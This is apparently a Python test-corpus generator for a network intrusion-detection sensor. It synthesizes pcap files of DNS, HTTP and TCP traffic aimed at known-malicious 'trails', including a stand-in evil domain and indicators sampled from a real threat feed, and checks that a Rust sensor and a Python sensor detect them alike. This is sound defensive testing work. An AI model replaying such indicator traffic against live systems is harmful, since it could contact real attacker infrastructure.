    #     is never examined - a stub resolver walking its `search` list does exactly this. The Rust
    #     sensor mixes a payload hash into the comparison, so the repeat is still skipped and a
    #     different query is not. Expected Rust-only event.
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50901, 53, dns_query("clean-first.com"))))),
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50901, 53, dns_query("evil-test-domain.com"))))),
    ]
    cases.append(("dns_same_socket_burst", DLT_EN10MB, packets, ["evil-test-domain.com"],
                  "distinct DNS queries sharing a socket in one second (deliberate divergence)"))

    # 35. mixed traffic soup (everything at once, interleaved)
    soup = []
    for i, (_name, _lt, pkts, _exp, _notes) in enumerate(cases[:12]):
        for ts, raw in pkts[:4]:
            soup.append((ts + i, raw))
    soup.sort(key=lambda item: item[0])
    cases.append(("mixed_soup", DLT_EN10MB, soup, [], "interleaved traffic from many cases"))

    return cases


# --- corpus built from the REAL trail data --------------------------------------
#
# The hand-written cases above use a 30-row fixture, which cannot catch anything that depends
# on real trail data: a domain whose parent is also a trail, a trail that only exists in a
# feed, a 1.5M-row store. (That gap is exactly how a stale-trails bug survived - the fixture
# had no `511mon.kozow.com`, and the real file was weeks old.) `--from-trails` samples the
# operator's actual trails.csv, synthesizes the traffic each sampled trail should trip, and
# emits a corpus that runs against the FULL real trails file.

REAL_BUCKETS = ("dns_domain", "dns_subdomain", "http_host", "ipv4", "ipv4_port", "ipv6", "url_path", "host_path")


def _sample_key(trail):
    """A stable pseudo-random sort key. `hash()` is salted per process, `crc32` is not, so the
    same trails.csv always yields the same sample - a parity failure stays reproducible."""
    import zlib
    return zlib.crc32(trail.encode("utf8", "replace")) & 0xffffffff


def classify_real_trail(trail, reference, ignored_suffixes, valid_dns):
    """Which traffic shape (if any) would exercise this trail. `None` = not usable as a
    generated case (wildcards cannot be instantiated, whitelisted trails never load, ...)."""
    import re as _re
    if not trail or trail != trail.strip():
        return None
    # A wildcard/regex trail cannot be instantiated as traffic; the same test the sensor uses.
    if _re.search(r"[\].][*+]|\[[a-z0-9_.\-]+\]", trail, _re.I) and _re.escape(trail) != trail:
        return None
    if '/' in trail:
        if trail.startswith('/'):
            return "url_path" if len(trail) > 1 else None
        host = trail.split('/')[0]
        return "host_path" if valid_dns.match(host) else None
    if ':' in trail:
        addr, _, port = trail.rpartition(':')
        if port.isdigit() and 0 < int(port) < 65536:
            try:
                socket.inet_aton(addr)
                return "ipv4_port" if addr.count('.') == 3 else None
            except Exception:
                return None
        try:                                            # a bare IPv6 address trail
            socket.inet_pton(socket.AF_INET6, trail)
            return "ipv6"
        except Exception:
            return None
    try:
        socket.inet_aton(trail)
        if trail.count('.') == 3:
            return "ipv4"
    except Exception:
        pass
    if '.' in trail:
        # sensor.py:911 - a query is ignored when the LAST label is in IGNORE_DNS_QUERY_SUFFIXES.
        if not valid_dns.match(trail) or trail.split('.')[-1] in ignored_suffixes:
            return None
        if trail.startswith('.') or trail.endswith('.') or ".intranet." in trail:
            return None
        return "dns_domain"
    return None


def build_real_cases(trails_file, per_bucket):
    """Sample the real trails.csv and synthesize one pcap per bucket.

    Returns (cases, sampled) where `sampled` maps case name -> [(trail, info)], so a parity
    failure names the trail that broke rather than just a pcap.
    """
    import csv
    import heapq
    import re as _re

    sys.path.insert(0, ROOT)
    from core.common import check_whitelisted
    from core.settings import IGNORE_DNS_QUERY_SUFFIXES, VALID_DNS_NAME_REGEX
    valid_dns = _re.compile(VALID_DNS_NAME_REGEX)
    _re_module = _re

    # sensor.py:303 `_check_domain_whitelisted` - a trail whose PARENT domain is whitelisted
    # (e.g. anything under cloudfront.net) is suppressed even though the trail itself loaded.
    from core.settings import WHITELIST
    # the old (Python) sensor lives in old/; it is the source of truth for this predicate
    sys.path.insert(0, os.path.join(ROOT, "old"))
    from sensor import _check_domain_member

    def check_domain_whitelisted(query):
        return _check_domain_member(_re.split(r"(?i)[^A-Z0-9._-]", query or "")[0], WHITELIST)
    ignored = frozenset(IGNORE_DNS_QUERY_SUFFIXES)

    # Keep the `per_bucket` smallest sample keys per bucket: a deterministic uniform sample
    # that needs one streaming pass and O(per_bucket) memory over a 76 MB file.
    heaps = dict((bucket, []) for bucket in REAL_BUCKETS)
    seen_hosts = dict((bucket, set()) for bucket in REAL_BUCKETS)
    csv.field_size_limit(1 << 20)
    rows = 0
    with open(trails_file) as f:
        for row in csv.reader(f, delimiter=',', quotechar='"'):
            if not row or len(row) != 3:
                continue
            trail, info, reference = row
            rows += 1
            if check_whitelisted(trail):
                continue
            bucket = classify_real_trail(trail, reference, ignored, valid_dns)
            if bucket is None:
                continue
            # One case per host/address keeps the flows independent: two trails under the same
            # name would collide in the sensor's per-flow caches and mask each other.
            head = trail.split('/')[0]
            host = head.rpartition(':')[0] or head or trail      # a '/path' trail has no host
            if host in seen_hosts[bucket]:
                continue
            key = _sample_key(trail)
            heap = heaps[bucket]
            if len(heap) < per_bucket:
                heapq.heappush(heap, (-key, trail, info))
                seen_hosts[bucket].add(host)
            elif -key > heap[0][0]:
                dropped = heapq.heapreplace(heap, (-key, trail, info))
                dropped_head = dropped[1].split('/')[0]
                seen_hosts[bucket].discard(dropped_head.rpartition(':')[0] or dropped_head or dropped[1])
                seen_hosts[bucket].add(host)

    samples = dict((bucket, sorted((t, i) for _, t, i in heaps[bucket])) for bucket in REAL_BUCKETS)
    # Domains double as HTTP Host and as a sub-labelled query; sample them from the same pool
    # so a difference between the three code paths is attributable to the path, not the data.
    samples["dns_subdomain"] = samples["dns_domain"]
    samples["http_host"] = samples["dns_domain"]

    # A host/path trail whose BARE PATH is also a trail in its own right never produces the
    # host-qualified trail text. Both sensors build their URL candidates as
    # `for check in checks: for prefix in ('', host)`, so `/path` is the very first probe and
    # matches one prefix EARLIER than `host/path`; the event is real, but it is labelled
    # `(host)/path` after the path-only row. Feeds publish both forms often enough that 19 of a
    # 25-trail sample here were such pairs, so the gate failed on a detection that had happened.
    #
    # Expect the text that is actually emitted, rather than dropping these from the must-detect
    # list: `parity.py` matches expectations as substrings, and `/path` is a substring of
    # `(host)/path`, so this still asserts the event and keeps the bucket's coverage.
    #
    # A second streaming pass rather than a set of every url_path trail: this sampler is
    # deliberately O(per_bucket) in memory over a ~90 MB file, and there are at most
    # `per_bucket` paths to ask about. Whitelisted rows do not count — they never load, so they
    # cannot shadow anything.
    shadowing_paths = set()
    wanted_paths = set('/' + t.partition('/')[2] for t, _ in samples["host_path"])
    if wanted_paths:
        with open(trails_file) as f:
            for row in csv.reader(f, delimiter=',', quotechar='"'):
                if len(row) == 3 and row[0] in wanted_paths and not check_whitelisted(row[0]):
                    shadowing_paths.add(row[0])

    def expected_text(bucket, trail):
        """The trail text an event will actually carry, which is not always the trail itself."""
        if bucket == "host_path":
            bare = '/' + trail.partition('/')[2]
            if bare in shadowing_paths:
                return bare
        return trail

    cases, sampled, dead = [], {}, {}
    client = "10.13.13.13"

    def undetectable(bucket, trail, info):
        """Why this sampled trail cannot produce an event even on a correct sensor.

        These are properties of the trail DATA against the shipped detection rules, each with the
        line in sensor.py that suppresses it. Such trails still go into the pcap (parity must
        cover them) but are kept out of `expect`, which is the absolute must-detect list.
        """
        if bucket in ("ipv4", "ipv4_port") and "attacker" in info:
            return "sensor.py:559 - the destination-side SYN branch suppresses 'attacker' infos"
        if bucket == "host_path":
            host = trail.split('/')[0]
            if _re_module.match(r"\A\d+\.[0-9.]+\Z", host):
                return "sensor.py:661 - a numeric Host takes the iot-download branch, not the URL lookup"
            if trail.endswith('/'):
                return "sensor.py:754 - `checks = [path.rstrip('/')]`, so a trail ending in '/' is unreachable"
            # The host is matched against the whitelist before the URL lookup runs, so a
            # host/path trail under e.g. raw.githubusercontent.com can never fire. `check_whitelisted`
            # at sample time does not catch this: it tests the whole trail, not its host.
            if check_domain_whitelisted(host):
                return "the trail's host is whitelisted"
        if bucket in ("dns_domain", "dns_subdomain", "http_host") and check_domain_whitelisted(trail):
            return "the trail's parent domain is whitelisted"
        return None

    def add(name, bucket, packets, trails, notes):
        if not packets:
            return
        # `expect` holds the trail text itself: every expected trail must show up in at least one
        # event, in BOTH sensors. That is the absolute check - parity alone would happily agree
        # on detecting nothing.
        reasons = dict((t, undetectable(bucket, t, i)) for t, i in trails)
        cases.append((name, DLT_EN10MB, packets, [expected_text(bucket, t) for t, _ in trails if not reasons[t]], notes))
        sampled[name] = trails
        dead[name] = [{"trail": t, "reason": r} for t, r in sorted(reasons.items()) if r]

    packets = []
    for i, (trail, _) in enumerate(samples["dns_domain"]):
        packets.append((BASE_SEC + i, eth(ipv4(client, "8.8.8.8", 17, udp(30000 + i, 53, dns_query(trail))))))
    add("real_dns_domain", "dns_domain", packets, samples["dns_domain"], "DNS queries for real domain trails")

    packets = []
    for i, (trail, _) in enumerate(samples["dns_subdomain"]):
        name = "sub%d.%s" % (i, trail)
        packets.append((BASE_SEC + i, eth(ipv4(client, "8.8.8.8", 17, udp(31000 + i, 53, dns_query(name))))))
    add("real_dns_subdomain", "dns_subdomain", packets, samples["dns_subdomain"],
        "DNS queries one label BELOW a real domain trail (the parent-suffix walk)")

    packets = []
    for i, (trail, _) in enumerate(samples["http_host"]):
        packets.append((BASE_SEC + i, eth(ipv4(client, "203.0.113.80", 6,
                                               tcp(32000 + i, 80, 0x18, http_get("/", host=trail))))))
    add("real_http_host", "http_host", packets, samples["http_host"], "HTTP requests whose Host is a real domain trail")

    packets = []
    for i, (trail, _) in enumerate(samples["ipv4"]):
        packets.append((BASE_SEC + i, eth(ipv4(client, trail, 6, tcp(33000 + i, 443, 0x02)))))
    add("real_ipv4", "ipv4", packets, samples["ipv4"], "TCP SYNs to real IPv4 trails")

    packets = []
    for i, (trail, _) in enumerate(samples["ipv4_port"]):
        addr, _, port = trail.rpartition(':')
        packets.append((BASE_SEC + i, eth(ipv4(client, addr, 6, tcp(34000 + i, int(port), 0x02)))))
    add("real_ipv4_port", "ipv4_port", packets, samples["ipv4_port"], "TCP SYNs to real IPv4:port trails")

    packets = []
    for i, (trail, _) in enumerate(samples["ipv6"]):
        packets.append((BASE_SEC + i, eth(ipv6("dead:beef::13", trail, 6, tcp(37000 + i, 443, 0x02)), 0x86dd)))
    add("real_ipv6", "ipv6", packets, samples["ipv6"], "TCP SYNs to real IPv6 trails")

    packets = []
    for i, (trail, _) in enumerate(samples["url_path"]):
        packets.append((BASE_SEC + i, eth(ipv4(client, "203.0.113.80", 6,
                                               tcp(35000 + i, 80, 0x18,
                                                   http_get(trail, host="host%d.example" % i))))))
    add("real_url_path", "url_path", packets, samples["url_path"], "HTTP requests for real path trails")

    packets = []
    for i, (trail, _) in enumerate(samples["host_path"]):
        host, _, path = trail.partition('/')
        packets.append((BASE_SEC + i, eth(ipv4(client, "203.0.113.80", 6,
                                               tcp(36000 + i, 80, 0x18,
                                                   http_get("/%s" % path, host=host))))))
    add("real_host_path", "host_path", packets, samples["host_path"], "HTTP requests for real host/path trails")

    return cases, sampled, dead, rows


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", default=os.path.join(ROOT, "sensor", "tests", "corpus"))
    parser.add_argument("--from-trails", dest="from_trails",
                        help="build a corpus from real trails in this CSV instead of the fixture cases")
    parser.add_argument("--per-bucket", type=int, default=25,
                        help="how many real trails to sample per traffic shape (--from-trails)")
    options = parser.parse_args()

    out = os.path.abspath(options.out)
    if not os.path.isdir(out):
        os.makedirs(out)

    if options.from_trails:
        return main_from_trails(options, out)

    with open(os.path.join(out, "trails.csv"), "w") as f:
        for trail, info, reference in TRAILS:
            f.write("%s,%s,%s\n" % (trail, info, reference))

    manifest = []
    for name, linktype, packets, expected, notes in build_cases():
        filename = "%s.pcap" % name
        write_pcap(os.path.join(out, filename), packets, linktype)
        manifest.append({
            "name": name,
            "pcap": filename,
            "linktype": linktype,
            "packets": len(packets),
            "expect": expected,
            "expect_rust_only": DIVERGENCE_CASES.get(name, []),
            "needs_pcap_timestamps": name in TIMING_WINDOW_CASES,
            "timestamp_sensitive": name in TIMESTAMP_SENSITIVE_CASES,
            "notes": notes,
        })

    with open(os.path.join(out, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2, sort_keys=True)
        f.write("\n")

    print("[i] wrote %d pcap(s) + trails.csv + manifest.json to %s" % (len(manifest), out))
    print("[i] total packets: %d" % sum(_["packets"] for _ in manifest))


def main_from_trails(options, out):
    trails_file = os.path.abspath(os.path.expanduser(options.from_trails))
    if not os.path.isfile(trails_file):
        sys.exit("[!] no such trails file: '%s'" % trails_file)

    cases, sampled, dead, rows = build_real_cases(trails_file, options.per_bucket)

    # parity.py reads <corpus>/trails.csv - point it at the REAL file so both sensors load the
    # whole 1.5M-row store, not a fixture. A symlink avoids a second 76 MB copy.
    link = os.path.join(out, "trails.csv")
    if os.path.islink(link) or os.path.isfile(link):
        os.remove(link)
    try:
        os.symlink(trails_file, link)
    except (OSError, AttributeError):
        import shutil
        shutil.copyfile(trails_file, link)

    manifest = []
    for name, linktype, packets, expected, notes in cases:
        filename = "%s.pcap" % name
        write_pcap(os.path.join(out, filename), packets, linktype)
        manifest.append({
            "name": name,
            "pcap": filename,
            "linktype": linktype,
            "packets": len(packets),
            "expect": expected,
            "needs_pcap_timestamps": False,
            "timestamp_sensitive": False,
            "notes": notes,
            "sampled": [{"trail": t, "info": i} for t, i in sampled.get(name, [])],
            "undetectable": dead.get(name, []),
        })

    with open(os.path.join(out, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2, sort_keys=True)
        f.write("\n")

    print("[i] sampled %d row(s) from '%s'" % (rows, trails_file))
    for entry in manifest:
        print("[i]   %-22s %3d packet(s), %3d must-detect, %3d known-undetectable"
              % (entry["name"], entry["packets"], len(entry["expect"]), len(entry["undetectable"])))
    print("[i] wrote %d pcap(s) + manifest.json to %s (trails.csv -> the real file)" % (len(manifest), out))
    print("[i] now run: python3 sensor/tools/parity.py --corpus %s" % out)


if __name__ == "__main__":
    main()
